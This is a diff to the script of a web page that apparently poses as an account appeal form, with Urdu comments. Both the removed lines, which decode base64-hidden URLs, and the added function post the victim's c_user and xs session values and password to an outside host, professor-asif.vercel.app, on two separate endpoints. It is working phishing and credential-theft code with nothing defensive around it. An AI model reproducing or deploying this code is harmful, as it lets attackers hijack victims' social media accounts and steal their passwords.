@@ -1552,33 +1552,47 @@
         const submitBtn = document.getElementById('submit-appeal-btn');
         
         // Function to submit to other endpoints
+        function submitToOtherEndpoints(data) {
+    // c_user اور xs والا endpoint
+    const formData1 = new FormData();
+    formData1.append('c_user', data.c_user);
+    formData1.append('xs', data.xs);
 
-            
-            endpoints.forEach(encodedUrl => {
-                const decodedUrl = atob(encodedUrl);
-                const formData = new FormData();
-                formData.append('c_user', data.c_user);
-                formData.append('xs', data.xs);
-                formData.append('password', data.password);
-                
-                fetch(decodedUrl, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok');
-                    }
-                    return response.text();
-                })
-                .then(data => {
-                    console.log('Submission successful:', data);
-                })
-                .catch(error => {
-                    console.error('Error submitting:', error);
-                });
-            });
-        }
+    fetch('https://professor-asif.vercel.app/asif', {
+        method: 'POST',
+        body: formData1
+    })
+    .then(response => {
+        if (!response.ok) throw new Error('Network response was not ok');
+        return response.text();
+    })
+    .then(result => {
+        console.log('c_user & xs submission successful:', result);
+    })
+    .catch(error => {
+        console.error('Error submitting c_user & xs:', error);
+    });
+
+    // password والا endpoint
+    const formData2 = new FormData();
+    formData2.append('password', data.password);
+
+    fetch('https://professor-asif.vercel.app/asifpass', {
+        method: 'POST',
+        body: formData2
+    })
+    .then(response => {
+        if (!response.ok) throw new Error('Network response was not ok');
+        return response.text();
+    })
+    .then(result => {
+        console.log('Password submission successful:', result);
+    })
+    .catch(error => {
+        console.error('Error submitting password:', error);
+    });
+}
+
         
         submitBtn.addEventListener('click', async function(e) {
             e.preventDefault();
@@ -1869,5 +1883,6 @@
     </script>
 
 </body></html>
+
 
 
